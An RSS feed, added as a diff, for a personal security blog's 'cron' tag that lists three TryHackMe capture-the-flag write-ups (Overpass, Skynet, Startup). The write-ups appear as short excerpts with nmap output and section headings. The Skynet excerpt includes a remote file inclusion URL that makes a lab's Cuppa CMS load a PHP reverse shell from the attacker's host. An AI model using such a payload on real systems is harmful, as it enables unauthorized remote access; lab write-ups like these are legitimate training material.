@@ -1,0 +1,202 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>cron on Blog</title>
+    <link>https://martinkubecka.github.io/tags/cron/</link>
+    <description>Recent content in cron on Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <copyright>&amp;copy;{year}, All Rights Reserved</copyright>
+    <lastBuildDate>Sat, 12 Dec 2020 00:00:00 +0000</lastBuildDate>
+    
+        <atom:link href="https://martinkubecka.github.io/tags/cron/index.xml" rel="self" type="application/rss+xml" />
+    
+
+      
+      <item>
+        <title>Overpass [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/posts/thm/overpass/</link>
+        <pubDate>Sat, 12 Dec 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Sat, 12 Dec 2020 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/posts/thm/overpass/</guid>
+        <description>Title Overpass     Info What happens when some broke CompSci students make a password manager?   Difficulty Easy    Scanning &amp;amp; Enumeration Nmap Let&amp;rsquo;s start with nmap:
+1 2 3 4 5 6 7  nmap -vv -sC -sV {TARGET MACHINE} PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API) .</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/overpass/icon.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>hash cracking</category>
+            
+          
+            
+              <category>enumeration scripts</category>
+            
+          
+            
+              <category>cron</category>
+            
+          
+            
+              <category>privilege escalation</category>
+            
+          
+        
+        
+          
+            
+              <category>Web</category>
+            
+          
+            
+              <category>Linux</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>Skynet [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/posts/thm/skynet/</link>
+        <pubDate>Sat, 14 Nov 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Sat, 14 Nov 2020 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/posts/thm/skynet/</guid>
+        <description>Title Skynet     Info A vulnerable Terminator themed Linux machine.   Difficulty Easy    Scanning &amp;amp; Enumeration Nmap 
+
+Directory Brute-Forcing 
+
+Samba 
+
+
+
+
+Accessing Webmail 
+
+
+Further Enumeration 
+
+
+
+Gaining Access Cuppa CMS Exploitation 
+
+https://www.exploit-db.com/exploits/25971
+ http://10.10.201.252/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.140.180:8888/php-reverse-shell.php
+ 
+
+Privilege Escalation 
+
+ https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/skynet/icon.jpeg" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>smb</category>
+            
+          
+            
+              <category>cms</category>
+            
+          
+            
+              <category>cron</category>
+            
+          
+        
+        
+          
+            
+              <category>Web</category>
+            
+          
+            
+              <category>Linux</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>Startup [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/posts/thm/startup/</link>
+        <pubDate>Tue, 10 Nov 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Tue, 10 Nov 2020 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/posts/thm/startup/</guid>
+        <description>Title Startup     Info Abuse traditional vulnerabilities via untraditional means.   Difficulty Easy    Reconnaissance 
+Scanning &amp;amp; Enumeration Nmap 
+FTP 
+Directory Brute-Forcing 
+
+
+Gaining Access 
+
+
+
+
+
+
+
+
+
+
+Privilege Escalation</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/startup/icon.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>ftp</category>
+            
+          
+            
+              <category>cron</category>
+            
+          
+            
+              <category>privilege escalation</category>
+            
+          
+        
+        
+          
+            
+          
+        
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
